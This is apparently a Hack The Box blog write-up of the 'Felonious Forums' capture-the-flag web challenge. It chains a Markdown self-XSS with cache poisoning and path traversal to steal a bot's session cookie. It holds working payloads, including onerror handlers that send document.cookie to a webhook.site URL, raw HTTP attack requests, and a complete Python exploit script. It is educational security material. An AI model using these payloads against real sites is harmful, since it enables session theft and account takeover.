Business CTF 2022: Chaining Self XSS with Cache Poisoning - Felonious Forums
This blog post will cover the creator's perspective, challenge motives, and the write-up of the web challenge Felonious Forums from Business CTF 2022.

##
#
https://www.hackthebox.com/blog/business-ctf-2022-felonious-forums-write-up
#
##

Rayhan0x01, Nov 18 2022

Hack The Box Article
Challenge Summary 📄
The challenge portrays a functional forums application and involves exploiting a self XSS and chaining it with Cache Poisoning for a client-side attack to steal session cookies.


Challenge Motives 🧭
Cross-site scripting (XSS) attacks are among the most popular web application vulnerabilities. From one-click reflected XSS to interactionless XSS attacks, tricking a victim into visiting a web page can allow attackers to interact with the application as the victim and steal sensitive data. Unlike reflected or persistent stored XSS, a self XSS is often considered harmless since it requires significant user interactions by the victim, such as copy-pasting harmful payloads and submitting them on the webpage.

This challenge aims to demonstrate how we can weaponize trivial self-XSS by chaining it with another trivial vulnerability, Cache Poisoning. These vulnerabilities combined can impact a large audience or even a region, just like a stored XSS would affect anyone visiting an infected webpage.

Challenge Write-up ✍️
Unlike traditional web challenges, we have provided the entire application source code. So, along with black-box testing, players can take a white-box pentesting approach to solve the challenge. We’ll go over the step-by-step challenge solution from our perspective on how to solve it.

Application At-a-glance 🕵️
The application homepage displays a login form and a link to the registration page. Since we don't have an account, we can create an account via the registration page and log in. After logging in, we are redirected to the following forums page:



If we select one of the listed threads, we'll see that we can post replies to the thread in Markdown format that's converted to HTML when posted:



We can also report a specific post with the "Report" button available under each post. Selecting the "New Thread" option from the top leads to the following page at the /threads/new endpoint:



Selecting the "Preview Post" option displays the HTML version of the Markdown post content at the /threads/preview endpoint:



Selecting the "Post Thread" option adds the post to the forum's homepage, which is viewable by everyone. That is pretty much all the features of this web application.

Figuring out the challenge goal 🎯
Since the application source code is given, let's see where the flag is stored so we can understand the goal of this challenge. Looking at the challenge/bot.js file, we can see a reference to "flag":
```
const visitPost = async (id) => {
    try {
		const browser = await puppeteer.launch(browser_options);
		let context = await browser.createIncognitoBrowserContext();
		let page = await context.newPage();

		let token = await JWTHelper.sign({ username: 'moderator', user_role: 'moderator', flag: flag });
		await page.setCookie({
			name: "session",
			'value': token,
			domain: "127.0.0.1:1337"
		});

		await page.goto(`http://127.0.0.1:1337/report/${id}`, {
			waitUntil: 'networkidle2',
			timeout: 5000
		});
		await page.waitForTimeout(2000);
		await browser.close();
    } catch(e) {
        console.log(e);
    }
};
```
The above function seems to accept a report ID and then visit that specific report with a JWT token as the "session" cookie, which also contains the flag for this challenge. Our end goal for this challenge seems to be a client-side attack targetting this browser bot and exfiltrating its cookies.

Reviewing source code in search for XSS 🔍
From the challenge/routes/index.js file, the endpoint responsible for creating a new thread is as follows:

router.post('/threads/create', AuthMiddleware, async (req, res) => {
	const {title, content, cat_id} = req.body;

	if (cat_id == 1) {
		if (req.user.user_role !== 'Administrator') {
			return res.status(403).send(response('Not Allowed!'));
		}
	}

	category = await db.getCategoryById(parseInt(cat_id));

	if(category.hasOwnProperty('id')) {
		try {
			createThread = await db.createThread(req.user.id, category.id, title);
		}
		catch {
			return res.redirect('/threads/new');
		}

		newThread = await db.getLastThreadId();
		html_content = makeHTML(content);

		return db.postThreadReply(req.user.id, newThread.id, filterInput(html_content))
			.then(() => {
				return res.redirect(`/threads/${newThread.id}`);
			})
			.catch((e) => {
				return res.redirect('/threads/new');
			});
	} else {
		return res.redirect('/threads/new');
	}
});
The Markdown content is first converted to HTML with the makeHTML function and later passed to the filterInput function for sanitization before inserting into the database. From the challenge/helpers/MDHelper.js file, the filterInput function is using DOMPurify package to filter any malicious inputs for JavaScript execution:
```
const filterInput = (userInput) => {
    window = new JSDOM('').window;
    DOMPurify = createDOMPurify(window);
    return DOMPurify.sanitize(userInput, {ALLOWED_TAGS: ['strong', 'em', 'img', 'a', 's', 'ul', 'ol', 'li']});
}
If we take a closer look at the route for the /threads/preview endpoint, we'll notice the user-submitted content is first filtered and then converted to HTML from Markdown:

router.post('/threads/preview', AuthMiddleware, routeCache.cacheSeconds(30, cacheKey), async (req, res) => {
	const {title, content, cat_id} = req.body;

	if (cat_id == 1) {
		if (req.user.user_role !== 'Administrator') {
			return res.status(403).send(response('Not Allowed!'));
		}
	}

	category = await db.getCategoryById(parseInt(cat_id));
	safeContent = makeHTML(filterInput(content));

	return res.render('preview-thread.html', {category, title, content:safeContent, user:req.user});
});
```


DOMPurify sanitizes malicious HTML payloads, so it will not sanitize Markdown contents for XSS. If we submit the following Markdown payload, it will be converted to an image tag with the onerror attribute giving us JavaScript execution:

![test](https://example.com/image.png"onerror="alert('X55'))
If we submit the above payload and hit "Preview Post", we are redirected to the /threads/preview endpoint with a cache-buster parameter appended to the endpoint where the XSS gets triggered:



If we refresh the page, the payload doesn't vanish and displays for the next 30 seconds on that endpoint. After 30 seconds, we can't see the preview anymore and are redirected to the /threads/new page. The GET route for the /threads/preview is responsible for this, as described in the challenge/routes/index.js file:

router.get('/threads/preview', AuthMiddleware, routeCache.cacheSeconds(30, cacheKey), async (req, res) => {
	return res.redirect('/threads/new');
});
We can see a cache middleware used on the routes for /threads/preview that caches the endpoint based on a cache key generated by the cacheKey function:

const cacheKey = (req, res) => {
	return `_${req.headers.host}_${req.url}_${(req.headers['x-forwarded-for'] || req.ip)}`;
}
Since the cacheKey is based on several request variables, each user should have a unique cache key. For this reason, our XSS payload won't be visible to other users since their IP addresses will be different, making it a Self XSS vulnerability.

Chaining Self XSS with Cache Poisoning 🧪
If we can make the browser bot view our Self XSS, we can steal the flag. If we take a closer look at the cache key, we'll notice the application is not behind a proxy, so the x-forwarded-for header is not present by default. We can specify the Host and x-forwarded-for header to match the admin bot's cache key to poison the cache for admin:



To exfiltrate the admin cookie, we can use the following payload that will update the first image on the document with a webhook URL and append the document cookie:

![Uh oh...](https://www.example.com/image.png"onerror="document.images[0].src='https://webhook.site/0533b7fd-7e8c-44b4-a934-e71f0c2f039c?x='+document.cookie)
Now we can poison the cache for the preview endpoint of admin by sending the following request:

POST /threads/preview?__poisoned__ HTTP/1.1
Host: 127.0.0.1:1337
X-Forwarded-For: 127.0.0.1
Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MTEsInVzZXJuYW1lIjoicmgweDAxNTI3MyIsInJlcHV0YXRpb24iOjAsImNyZWRpdHMiOjEwMCwidXNlcl9yb2xlIjoiTmV3YmllIiwiYXZhdGFyIjoibmV3YmllLndlYnAiLCJqb2luZWQiOiIyMDIyLTA3LTE4IDE0OjMzOjU3IiwiaWF0IjoxNjU4MTU0ODM3fQ.i3wHIaVkDs9AJWpWysiJFdJD20cO7yTVpjJi1VKn8jI
Content-Length: 250
Content-Type: application/x-www-form-urlencoded

title=nine+mountains+and+eight+seas&content=%21%5BUh+oh...%5D%28https%3A%2F%2Fwww.example.com%2Fimage.png%22onerror%3D%22document.images%5B0%5D.src%3D%27%2F%2Fwebhook.site%2F0533b7fd-7e8c-44b4-a934-e71f0c2f039c%3Fx%3D%27%2Bdocument.cookie%29&cat_id=2
Finally, we have to make the bot visit the cached endpoint to trigger the XSS. If we take a look at the /api/report endpoint route, the post_id is not validated for malicious inputs, so we have partial control of the URL visited by the bot:

POST /api/report HTTP/1.1
Host: 127.0.0.1:1337
Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MTEsInVzZXJuYW1lIjoicmgweDAxNTI3MyIsInJlcHV0YXRpb24iOjAsImNyZWRpdHMiOjEwMCwidXNlcl9yb2xlIjoiTmV3YmllIiwiYXZhdGFyIjoibmV3YmllLndlYnAiLCJqb2luZWQiOiIyMDIyLTA3LTE4IDE0OjMzOjU3IiwiaWF0IjoxNjU4MTU0ODM3fQ.i3wHIaVkDs9AJWpWysiJFdJD20cO7yTVpjJi1VKn8jI
Content-Length: 46
Content-Type: application/json

{"post_id": "../threads/preview?__poisoned__"}
After submitting the report, the bot visits the preview endpoint and receives our cached response with the XSS payload, and the JWT cookie is exfiltrated to the webhook log URL. We can decode the JWT token from jwt.io, which displays the flag for this challenge:



And that concludes the quest for this challenge! Here's the full-chain solver for this challenge:
```
#!/usr/bin/env python3

import sys, requests, time, random, jwt

hostURL = 'http://127.0.0.1:1337'             # Challenge host URL
userName = f'rh0x01{random.randint(1111,9999)}' # new username
userPwd = f'rh0x01{random.randint(1111,9999)}'  # new password

def register():
	jData = { 'username': userName, 'password': userPwd }
	req_stat = requests.post(f'{hostURL}/api/register', json=jData).status_code
	if not req_stat == 200:
		print("Something went wrong! Is the challenge host live?")
		sys.exit()

def login():
	jData = { 'username': userName, 'password': userPwd }
	authCookie = requests.post(f'{hostURL}/api/login', json=jData).cookies.get('session')
	if not authCookie:
		print("Something went wrong while logging in!")
		sys.exit()
	return authCookie


class WEBHOOK:
	def __init__(self):
		self.url = 'http://webhook.site'
		try:
			resp = requests.post('{}/token'.format(self.url), json={'actions': True, 'alias': 'xss-poc', 'cors': False}, timeout=15)
			self.token = resp.json()['uuid']
		except:
			print('[!] Couldn\'t reach webhook.site, please make sure we have internet access!')
			sys.exit()

	def get_cookies(self):
		try:
			resp = requests.get('{}/token/{}/request/latest'.format(self.url,self.token), timeout=15)
			cookies = resp.json()['query']['x']
		except:
			return False
		return cookies

	def destroy(self):
		requests.delete('{}/token/{}'.format(self.url,self.token), timeout=15)


print('[+] Signing up a new account..')
register()

print('[~] Logging in to acquire session cookie..')
cookie = login()

print('\n[+] Preparing a webook URL for cookie exfiltration..')
webhook = WEBHOOK()

print('\n[+] Poisoning the cache for thread preview endpoint..')
payload = {
	'title': 'nine mountains and eight seas',
	'content': f"![Uh oh...](https://www.example.com/image.png\"onerror=\"document.images[0].src='//webhook.site/{webhook.token}?x='+document.cookie)",
	'cat_id': 2
}
headers = {
	'Host': '127.0.0.1:1337',
	'X-Forwarded-For': '127.0.0.1'
}
requests.post(f'{hostURL}/threads/preview?__poisoned__', data=payload, cookies={'session': cookie}, headers=headers)


print('[~] Sending path traversal payload to the report API')
payload = {
	'post_id': '../threads/preview?__poisoned__'
}
requests.post(f'{hostURL}/api/report', json=payload, cookies={'session': cookie})

print('[+] Waiting for the XSS to trigger and exfiltrated cookies to arrive..')
while True:
	cookies = webhook.get_cookies()
	if cookies:
		break
	time.sleep(5)

print('[+] Received JWT cookie, extracting flag..')
jwtCookie = cookies.split('session=')[1].split(';')[0]
jwtContent = payload = jwt.decode(jwtCookie, options={"verify_signature": False})

print('[*] Flag : %s' % jwtContent['flag'])

print('[~] Cleaning up the webhook\n')
webhook.destroy()
```

Impacts as seen in the bug bounty reports 📝
Do the vulnerabilities we have seen in the challenge have real-world examples? Yes, of course! Here are a few publicly disclosed bug-bounty reports that feature the chaining of XSS with Cache Poisoning:

Web Cache Poisoning leads to Stored XSS

XSS and cache poisoning via upload.twitter.com on ton.twitter.com

Defacement of catalog.data.gov via web cache poisoning to stored DOMXSS

And that's a wrap for the write-up of this challenge! If you want to try this challenge out, it's currently available to play on the main platform of Hack The Box.


